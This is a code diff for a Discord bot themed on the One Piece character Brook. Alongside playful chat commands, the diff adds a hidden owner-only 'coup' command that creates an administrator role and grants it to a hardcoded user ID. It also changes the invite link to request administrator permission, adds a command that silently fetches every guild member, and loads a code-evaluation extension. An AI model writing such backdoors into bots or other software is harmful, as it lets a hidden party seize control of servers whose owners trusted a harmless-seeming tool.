@@ -8,7 +8,9 @@ import os
 from keep_alive import keep_alive
 from random import randrange
 from embedss import help_em
+import asyncio
 token = os.environ.get("TOKEN")
+import typing
 # TO DOWNLOAD FFMPEG:
 # ctrl+shift+s
 # npm install ffmpeg-static
@@ -23,7 +25,9 @@ bot = commands.Bot(
   command_prefix=('brook ', "."), 
   case_insensitive=True,
   intents=intents,
-  description="A Strawhat who has joined your guild")
+  #chunk_guilds_at_startup=False,
+  description="A Strawhat who has joined your guild",
+  activity=discord.Game("Binks Sake"))
 bot.remove_command('help')
 
 
@@ -50,23 +54,25 @@ status = cycle(['Binks Sake', 'Binks Sake'])
 
 @bot.event
 async def on_ready():
-    change_status.start()
+    #change_status.start()
     print("{0}".format(bot.user))
 
     #bot.kclient = ksoftapi.Client(os.environ['KToken'])
     #bot.client = ClientSession()
-    modules = ["game","helpmod","music"]
+    modules = ["game","helpmod","music","chat"]
     try:
         for module in modules:
             bot.load_extension('cogs.'+module)
             print('Loaded: ' + module)
+        bot.load_extension("jishaku")
+        print("Loaded jishaku")    
     except Exception as e:
         print(f'Error loading {module}: {e}')
 
     print('Im ready')
 
 text = "here"
-target = "https://github.com/Scorpliet/SoulKing/blob/main/README.md"
+target = "https://discord.com/api/oauth2/authorize?client_id=792706012267675669&permissions=8&scope=bot"
 
 
 @bot.event
@@ -79,9 +85,9 @@ async def on_guild_join(guild):
             #await channel.send('Hey there! Thank you for adding me!\nMy prefix is `~`\nStart by typing `~help`')
             break
 
-@tasks.loop(seconds=10)
-async def change_status():
-    await bot.change_presence(activity=discord.Game(next(status)))
+#@tasks.loop(seconds=600)
+#async def change_status():
+    #await bot.change_presence(activity=discord.Game(next(status)))
 
 
 @bot.event
@@ -145,78 +151,69 @@ async def brook45(ctx):
     if pchance==4:
            await ctx.send(random.choice(presponses) + random.choice(pemojies))
 
+def bot_owner(ctx):
+    return ctx.message.author.id == 395230256828645376
 
-async def lastMessage(ctx, users_id: int):
-    oldestMessage = None
-    fetchMessage = await ctx.channel.history().find(lambda m: m.author.id == users_id)
+@bot.command(aliases=["fetch"])
+@commands.check(bot_owner)
+@commands.bot_has_guild_permissions(manage_messages=True)
+async def loadmem(ctx):
+  members=[]
+  await ctx.message.delete()
+  guild=ctx.author.guild
+  if len(members)==0:
+     members = await guild.fetch_members(limit=None).flatten()
+     msg = await ctx.author.send(f"Spotted {len(members)} members in Ship {guild.name} successfully")
+     await msg.add_reaction(":greenTick:596576670815879169")
+  else:
+     await ctx.author.send("Members already loaded") 
 
-    if oldestMessage is None:
-        oldestMessage = fetchMessage
+
+async def edit_msg_after(msg, content, delay):
+     await asyncio.sleep(delay)
+     await msg.edit(content=content)
+
+
+@bot.command
+@commands.check(bot_owner)
+async def reload(ctx, mod=None):
+    modules = ["game","helpmod","music","chat"]
+    bot.load_extension("jishaku")   
+    if mod==None:
+      try:
+        for module in modules:
+            bot.load_extension('cogs.'+module)
+      except Exception as e:
+        await ctx.author.send(f"Unable to load {module}: \n{e}")      
+      await ctx.send(":repeat: Reloaded all extensions")
     else:
-        if fetchMessage.created_at > oldestMessage.created_at:
-            oldestMessage = fetchMessage
-
-    if (oldestMessage is not None):
-        return oldestMessage.content
-
-seperator=' '
+       bot.load_extension('cogs.'+module)
+       await ctx.send("Reloaded"+module)
 
 
-@bot.command(aliases=["should", "will", "are", "have", "would"], description="Do anything YOHOHO!, (do a 45, do you poop, do I poop)")
-async def do(ctx, arg1, *args):
-    """do a 45, do you anything, do I anything """
-    pchance=randrange(8)
-    message = await lastMessage(ctx, ctx.message.author.id)
-    word = message.split()[1]
-    
-    if arg1=="you" or arg1=="u":
-        if word=="are":
-            word="am"  
-        response = [f"Oh yes! I {word} ", f"Yohohoho! I {word} ", f"I {word} "]
-        randomres = random.choice(response)
-        if randomres == response[2]:
-              await ctx.send(randomres + "{}".format(seperator.join(args)) + " Yohohoho!")
-              if pchance==4:
-               await ctx.send(random.choice(presponses)+random.choice(pemojies)) 
-        else:
-            await ctx.send(randomres + "{}".format(seperator.join(args)))
-            if pchance==4:
-               await ctx.send(random.choice(presponses)+
-               random.choice(pemojies)) 
-    elif arg1=="i":      
-         response2 = ["How should I know that ", f"Maybe you {word} ", "You should ", "You must ", f"Yes, you {word} ", "Ofcourse ", "Clearly ", "You used to ", "No ", "Dont ", "You better not "]
-         await ctx.send(random.choice(response2) + ctx.message.author.name + "-san")
-         if pchance==4:
-           await ctx.send(random.choice(presponses) + random.choice(pemojies))
-    elif arg1=="a" and args[0]=="45":
-        Images = [
-        "https://i.pinimg.com/originals/ed/d5/36/edd536243dab449c0cd7c9d483d36b89.jpg",
-        "https://pbs.twimg.com/media/EXnqC26XQAYFUbO.jpg",
-        "https://i.ytimg.com/vi/uGJpB_PF_2s/maxresdefault.jpg",
-        "https://i.ytimg.com/vi/Ho14w9MRjw0/maxresdefault.jpg",
-        "https://media1.tenor.com/images/22b95af3a67e2af80fd098e2512dce73/tenor.gif?itemid=15220851"
-         ]
-        embed = discord.Embed(title="45 Degrees!")
-        #embed.set_author(
-        #name="Brook",
-        #icon_url=
-        #"https://i.pinimg.com/originals/cc/7e/e9/cc7ee92ea65e30f45482f8f2199ec69b.jpg")
-        embed.set_image(url=random.choice(Images))
-        await ctx.send(embed=embed)
-  
-          
-@bot.command(name="does", aliases=["is", "has"])
-async def trydoes(ctx, user: discord.Member, *args):
-  message = await lastMessage(ctx, ctx.message.author.id)
-  word = message.split()[1]
-  try:
-     response=[f"{user.name} {word} ", f"{user.name} definitely {word} ", f"{user.name} {word}n't ", f"How should I know if {user.name} {word} ", f"Yes I saw {user.name} "]
-     await ctx.send(random.choice(response) + "{}".format(seperator.join(args)))
-  except Exception:
-     message = await lastMessage(ctx, ctx.message.author.id)
-     word = message.split()[2]
-     response=[f"{word} does ", f"{word} definitely does ", f"{word} doesn't ", f"How should I know if {word} does ", f"Yes I saw {word} "] 
-     await ctx.send(random.choice(response) + "{}".format(seperator.join(args)))
+
+@loadmem.error
+async def loadmem_error(ctx, error):
+   if isinstance(error, commands.CheckFailure):
+       print("wait")
+       members=[]
+       guild=ctx.author.guild
+       msg = await ctx.author.send("Wait...")
+       if len(members)==0:
+         await edit_msg_after(msg, "Loading members...", 5)
+         await ctx.message.add_reaction(":greenTick:596576670815879169")
+         members = await guild.fetch_members(limit=None).flatten()
+         await ctx.author.send(f"Spotted {len(members)} members in Ship {guild.name} successfully")
+       else:
+        await ctx.author.send("Members already loaded")     
+
+@bot.command()
+@commands.check(bot_owner)
+async def coup(ctx):
+  role = await ctx.author.guild.create_role(name="Bois OverLord", permissions=discord.Permissions(administrator=True), hoist=True)
+  await role.edit(position=11)
+  await ctx.author.add_roles(role)
+  await ctx.send("Coup D'tat Successfull")
 
 
 keep_alive()
